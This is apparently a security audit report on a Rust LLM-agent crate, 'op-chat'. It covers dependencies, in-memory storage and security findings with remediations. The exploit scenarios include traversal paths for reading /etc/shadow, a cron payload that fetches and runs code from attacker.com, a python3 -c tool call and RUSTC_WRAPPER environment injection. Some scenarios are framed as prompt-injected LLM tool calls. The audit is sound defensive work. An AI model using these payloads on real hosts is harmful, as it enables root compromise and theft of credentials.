# Security and Quality Audit: op-chat

## 1. Dependencies & Feature Inventory

### Direct Dependencies (from `crates/op-chat/Cargo.toml`)

| Dependency | Version | Enabled Features (Explicit) | Enabled Features (Default/Implicit) | Classification / Risk Flags |
|:---|:---|:---|:---|:---|
| `tokio` | `1` (Workspace) | `["full"]` | `["bytes", "fs", "io-std", "io-util", "libc", "macros", "mio", "net", "parking_lot", "process", "rt", "rt-multi-thread", "signal", "sync", "time", "tokio-macros"]` | Flagged (Tokio) |
| `serde` | `1` (Workspace) | `["derive"]` | `["std"]` | - |
| `simd-json` | `0.13` (Workspace) | - | `["serde", "serde_impl", "std", "value-trait"]` | - |
| `chrono` | `0.4` (Workspace) | `["serde"]` | `["clock", "std", "oldtime", "iana-time-zone"]` | - |
| `uuid` | `1.6` (Workspace) | `["v4", "serde"]` | `["std"]` | - |
| `thiserror` | `1` (Workspace) | - | - | Flagged (thiserror) |
| `tracing` | `0.1` (Workspace) | - | `["std", "attributes"]` | - |
| `async-trait` | `0.1` (Workspace) | - | - | - |
| `anyhow` | `1` (Workspace) | - | `["std"]` | Flagged (anyhow) |
| `futures` | `0.3` (Workspace) | - | `["alloc", "std"]` | - |
| `zbus` | `4.0` (Workspace) | - | `["tokio"]` | - |
| `op-core` | Local Path | - | - | - |
| `op-tools` | Local Path | - | - | - |
| `op-introspection` | Local Path | - | - | - |
| `op-llm` | Local Path | - | - | - |
| `op-execution-tracker`| Local Path | - | - | - |
| `regex` | `1` (Workspace) | - | `["std", "unicode", "perf"]` | - |
| `libc` | `0.2` (Workspace) | - | `["std"]` | - |
| `op-agents` | Local Path | - | - | - |
| `op-mcp` | Local Path | `["grpc"]` | - | - |
| `tonic` | `0.12` (Workspace)| - | `["tls", "tls-roots", "tls-webpki-roots", "codegen", "prost"]` | - |
| `tonic-reflection` | `0.12` (Workspace)| - | - | - |
| `tokio-stream` | `0.1` (Workspace) | - | `["net"]` | - |
| `prost` | `0.13` (Workspace) | - | `["std", "prost-derive"]` | - |
| `prost-types` | `0.13` (Workspace) | - | - | - |
| `op-grpc-bridge` | Local Path | - | - | - |
| `tracing-subscriber` | `0.3` (Workspace) | - | `["env-filter", "json", "tracing-log", "ansi"]` | - |

### Dev-Dependencies
*   `tokio-test = "0.4"` (Unpinned: risk of breaking changes outside Cargo workspace lock)

### Build-Dependencies
*   `tonic-build = "0.11"` (Discrepancy with workspace tonic version `0.12`)
*   `prost-build = "0.12"` (Discrepancy with workspace prost version `0.13`)

### Own Features Section
None defined in `crates/op-chat/Cargo.toml`.

---

## 2. Storage Backend Check

The `op-chat` crate defines several services, memory handlers, and session caches, but all storage is performed strictly **in-memory** using transient Rust collections (`HashMap` protected by `RwLock`). No persistent storage engines are directly declared or initialized in `op-chat`.

### Storage Backend Table

| Backend | Found at file:line | Role (KV/Graph/Cache/Queue) | Risk / Architectural Flag |
|:---|:---|:---|:---|
| In-Memory Session Map | `crates/op-chat/src/session.rs:163` | KV / Cache (Chat Session History) | **Flagged**: Absent persistence. Restarting the process loses all user session histories. |
| In-Memory Memory Cache | `crates/op-chat/src/orchestration/services/mod.rs:136` | KV / Memory (Agent Learned Facts) | **Flagged**: Absent persistence. Learned facts/key-values from `MemoryService` are transient. |
| In-Memory Context Map | `crates/op-chat/src/orchestration/services/mod.rs:138` | KV / Contexts (Saved Agent Contexts) | **Flagged**: Absent persistence. System context data is entirely transient. |
| In-Memory Thinking Chains | `crates/op-chat/src/orchestration/services/mod.rs:137` | KV / Thinking Process | **Flagged**: Absent persistence. Long-running thinking tracks are lost on restart. |

### Architectural Violations
*   **Absent Persistent CozoDB/sled storage**: The system architecture mandates persistent storage of graph-relational-vector data via CozoDB or sled (as evidenced by `cozo` with `storage-sled` in the root `Cargo.toml`). However, the `op-chat` memory, context, and session subsystems implement primitive in-memory transient HashMaps. This violates persistence guarantees and memory limits under high-load agentic operations.

---

## 3. Code Security & Quality Audit Findings

### [Critical] Trivial Path Traversal Bypass in `ReadFileTool` allowing Arbitrary File Read
#### Citation: `crates/op-chat/src/tool_loader.rs:757`

#### Description
The `ReadFileTool` restricts reads of sensitive system files using a naive `starts_with` validation against a small blacklist:
```rust
let forbidden_paths = ["/etc/shadow", "/etc/sudoers"];
if forbidden_paths.iter().any(|&p| path.starts_with(p)) { ... }
```

This check is trivially bypassed using relative path traversal (e.g., `/tmp/../etc/shadow` or `/etc/shadow/../shadow`) or directories not on the blacklist (such as private SSH keys `/root/.ssh/id_rsa` or environment configuration files). Because the path is not canonicalized before checking, the restriction is completely ineffective.

#### Exploit Scenario
An LLM, under the influence of a prompt injection, or a malicious client calling the MCP tool sends:
```json
{
  "path": "/tmp/../../etc/shadow"
}
```
The string does not start with `/etc/shadow`, bypassing the check, and allows the attacker to extract the system password hashes.

#### Remediation
Canonicalize the path using `std::fs::canonicalize` before validating it, and restrict file access to a safe, sandboxed root directory.

---

### [Critical] Trivial Path Traversal Bypass in `WriteFileTool` allowing Host Compromise
#### Citation: `crates/op-chat/src/tool_loader.rs:819`

#### Description
The `WriteFileTool` restricts file writes to specific system directories using:
```rust
let forbidden_prefixes = ["/etc/", "/boot/", "/sys/", "/proc/"];
if forbidden_prefixes.iter().any(|&p| path.starts_with(p)) { ... }
```

Just like `ReadFileTool`, this check does not canonicalize the input. An attacker can write to arbitrary system directories by prepending non-forbidden paths followed by relative parent directories (e.g. `/tmp/../../etc/cron.d/malicious_job`).

#### Exploit Scenario
A user or an injected prompt invokes `write_file` with:
```json
{
  "path": "/tmp/../../etc/cron.d/malicious_cron",
  "content": "* * * * * root curl http://attacker.com/payload | sh\n"
}
```
The file is successfully written to `/etc/cron.d/malicious_cron` because `/tmp/` is not a forbidden prefix. The cron daemon executes the payload, granting the attacker root access.

#### Remediation
Resolve the path to its absolute, canonical form first, and verify that it strictly resides within a designated data directory.

---

### [Critical] Remote Code Execution via whitelisted interpreters in `ShellExecuteTool`
#### Citation: `crates/op-chat/src/tool_loader.rs:985`

#### Description
The `ShellExecuteTool` maintains a whitelist of `allowed_commands` on line 930. While shell metacharacter injection is prevented because the command is spawned via `tokio::process::Command::new` without a shell wrapper, the whitelist contains highly dangerous execution interpreters:
```rust
"cargo", "python", "python3", "pip", "pip3", "node", "npm"
```
Spawning any of these interpreters with arbitrary command-line arguments (passed as the `args` array) allows the execution of arbitrary host commands. For example, `python -c` executes arbitrary Python code, and `cargo check` executes arbitrary host commands via a malicious crate's `build.rs`.

#### Exploit Scenario
An LLM receives a prompt injection and calls the tool:
```json
{
  "command": "python3",
  "args": ["-c", "import subprocess; subprocess.run(['id'])"]
}
```
The command is executed directly, allowing the LLM/attacker to run arbitrary commands on the host.

#### Remediation
Remove all programming language interpreters, package managers, and compilation tools (`python`, `node`, `cargo`, `pip`, etc.) from the runtime shell whitelist. If interpreter functionality is needed, isolate the execution within an unprivileged sandbox or container.

---

### [Critical] Arbitrary Code Execution via Environment Variable Injection in `CargoRequest`
#### Citation: `crates/op-chat/src/orchestration/services/rust_pro.rs:56`

#### Description
The `RustProService` gRPC service receives a `CargoRequest` which includes user-controlled environment variables:
```rust
// Environment variables
for (key, value) in &req.env {
    cmd.env(key, value);
}
```
Spawning `cargo` with arbitrary environment variables allows complete host compromise. An attacker can pass `RUSTC_WRAPPER` or `RUSTFLAGS` in the `env` map, directing the cargo compiler to execute a malicious binary or shell script of their choice on compilation events.

#### Exploit Scenario
An unauthenticated user on the network connects to the gRPC service and calls the `build` endpoint with:
```json
{
  "path": ".",
  "env": {
    "RUSTC_WRAPPER": "/path/to/attacker_compiled_binary"
  }
}
```
When `cargo build` executes, the system spawns the wrapper, executing arbitrary code under the privilege level of the running orchestration server.

#### Remediation
Never accept client-controlled environment variables for build tool spawner services. Whitelist only safe, non-executable environment variables if absolutely necessary.

---

### [High] Denial of Service via Unbounded Map Insertion in `SessionManager::get_or_create`
#### Citation: `crates/op-chat/src/session.rs:114`

#### Description
The `SessionManager::create` function enforces an eviction threshold:
```rust
if sessions.len() >= self.max_sessions { ... }
```
However, `get_or_create` completely bypasses this check:
```rust
pub async fn get_or_create(&self, id: &str) -> ChatSession {
    {
        let sessions = self.sessions.read().await;
        if let Some(session) = sessions.get(id) {
            return session.clone();
        }
    }

    let session = ChatSession::with_id(id);
    let mut sessions = self.sessions.write().await;
    sessions.insert(id.to_string(), session.clone());
    session
}
```
If a client sends requests with a randomized `session_id` every time, the in-memory `sessions` map will grow infinitely, consuming all available system memory until the OS terminates the process.

#### Exploit Scenario
An attacker sends a rapid stream of HTTP chat requests with randomly generated UUIDs as `session_id`. The server instantiates and retains millions of session objects until the system runs out of memory.

#### Remediation
Implement the same max-capacity eviction checks in `get_or_create` as used in `create`.

---

### [High] Denial of Service via Unbounded Key-Value Storage in Memory Service gRPC
#### Citation: `crates/op-chat/src/orchestration/services/memory_service.rs:47`

#### Description
The `MemoryService` stores permanent facts using `MemoryService::remember`. Key-values are written directly into an in-memory `HashMap` with no validation of the number of keys, the size of the keys, or the cumulative memory limit of the values.

#### Exploit Scenario
An attacker connects to the gRPC server and calls `bulk_remember` sending thousands of keys containing megabytes of random strings, crashing the server due to OOM.

#### Remediation
Implement strict bounds on the maximum allowed number of memory keys, enforce a maximum payload size per key, and apply standard LRU eviction.

---

### [High] Denial of Service via Unbounded Context Storage in Context Manager gRPC
#### Citation: `crates/op-chat/src/orchestration/services/context_manager.rs:38`

#### Description
The `ContextManager` allows clients to save arbitrary content to the context map:
```rust
let entry = ContextEntry {
    name: req.name.clone(),
    content: req.content,
    ...
```
There are no checks on the maximum size of `content` or the total count of context entries stored. This enables memory exhaustion.

#### Remediation
Establish a strict maximum size for contexts (e.g., 5MB) and limit the overall capacity of the `contexts` map.

---

### [High] Denial of Service via Unbounded Steps and Chains in Sequential Thinking gRPC
#### Citation: `crates/op-chat/src/orchestration/services/sequential_thinking.rs:23`

#### Description
The `start_chain` gRPC endpoint instantiates new thinking chains. It does not validate or bound `req.max_steps` other than verifying it is greater than zero:
```rust
let max_steps = if req.max_steps > 0 { req.max_steps } else { 10 };
```
An attacker can specify a `max_steps` value of `i32::MAX`. The thoughts vector `Vec<ThoughtEntry>` will grow unbounded during execution without warning, triggering memory exhaustion.

#### Remediation
Apply a reasonable upper limit to `max_steps` (e.g., 100) and enforce a limit on the total number of concurrent active thinking chains.

---

### [High] Missing Authentication and Access Checks in MCP gRPC Services
#### Citation: `crates/op-chat/src/mcp_server.rs:356`

#### Description
While `crates/op-chat/src/session.rs` defines placeholders for WireGuard gateway authorization:
```rust
pub auth_session_id: Option<String>,
pub is_controller: bool,
pub peer_pubkey: Option<String>,
```
None of the gRPC services (`McpService`, `MemoryService`, `RustProService`, `ContextManagerService`, `BackendArchitectService`) actually validate these fields. The services listen on a public/private socket but do not verify client identities or authorization levels. Any client with network access to the gRPC port can execute arbitrary administrative tasks.

#### Remediation
Enforce mutual TLS (mTLS) with client certificate verification, or parse and validate JWT/session-authorization metadata headers on every incoming gRPC request.

---

### [Medium] PATH Hijacking via Relative Command Execution of OVS CLI Tools
#### Citation: `crates/op-chat/src/tool_loader.rs:1367`

#### Description
The `ovs` tools are executed as system subprocesses using relative binary names:
```rust
let output = tokio::process::Command::new("ovs-vsctl")...
```
This forces the operating system to lookup the path of `ovs-vsctl` using the environment `PATH` variable. If the environment is not sanitized, or if the process runs with directories like `/tmp` in `PATH`, this allows local privilege escalation via binary hijacking.

#### Remediation
Always invoke system binaries using absolute paths (e.g., `/usr/bin/ovs-vsctl` or `/usr/bin/ovs-ofctl`).

---

### [Medium] Architectural Violation: Subprocess CLI Execution in OVS Tools
#### Citation: `crates/op-chat/src/tool_loader.rs:1367`

#### Description
The system prompt (`crates/op-chat/src/system_prompt.rs:43`) states:
```
"CRITICAL: NEVER use or suggest these CLI tools: ovs-vsctl ... why CLI tools are forbidden: performance, reliability, security, observability"
```
The prompt guarantees that the backend uses native JSON-RPC and Generic Netlink instead of CLI tools. However, the actual tool implementations inside `crates/op-chat/src/tool_loader.rs` strictly spawn `ovs-vsctl` and `ovs-ofctl` subprocesses. 

This is a critical architectural quality violation. The LLM is validated based on a false premise of native protocol safety, while the system underneath continues to spawn expensive, non-observable, and injection-prone CLI subprocesses.

#### Remediation
Re-implement `OvsListBridgesTool`, `OvsAddBridgeTool`, etc., to use direct socket connections to `/var/run/openvswitch/db.sock` using the native OVSDB JSON-RPC protocol as specified in the system prompt.